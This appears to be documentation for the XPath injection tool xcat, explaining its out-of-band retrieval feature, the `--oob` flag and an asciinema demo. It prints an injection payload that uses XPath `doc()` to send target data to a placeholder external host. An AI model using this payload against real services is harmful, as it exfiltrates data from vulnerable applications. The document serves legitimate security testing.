The out-of-bounds (OOB) server that xcat provides is a powerful way of drastically speeding up 
retrieval.

It works by abusing the XPath `doc()` function, which is used to read arbitrary local or network 
files. Using this method xcat will instruct the service to load an XML file from it's server, passing 
any data it wishes to retrieve in the query string:

`doc(concat('http://[external-host]/data/123?d=', func.encode_for_uri(TARGET EXPRESSION)))`

This requires that:
- You have an externally routable IP that the target server can connect to
- The XPath library is configured to load external documents (many default configurations allow this)
- The port is not blocked by any firewalls

To enable this feature simply pass the `--oob` flag to any xcat command.

The `--oob` flag should in a `host:port` format, and it is up to you to find a combination that works. 
To test this combination run `xcat detect` and check that the `oob-http` feature is enabled.

## Demo

This shows xcat connecting to a local server and using the `--oob` flag to retrieve the document much 
faster than other methods.

<script id="asciicast-216047" src="https://asciinema.org/a/216047.js" async></script>
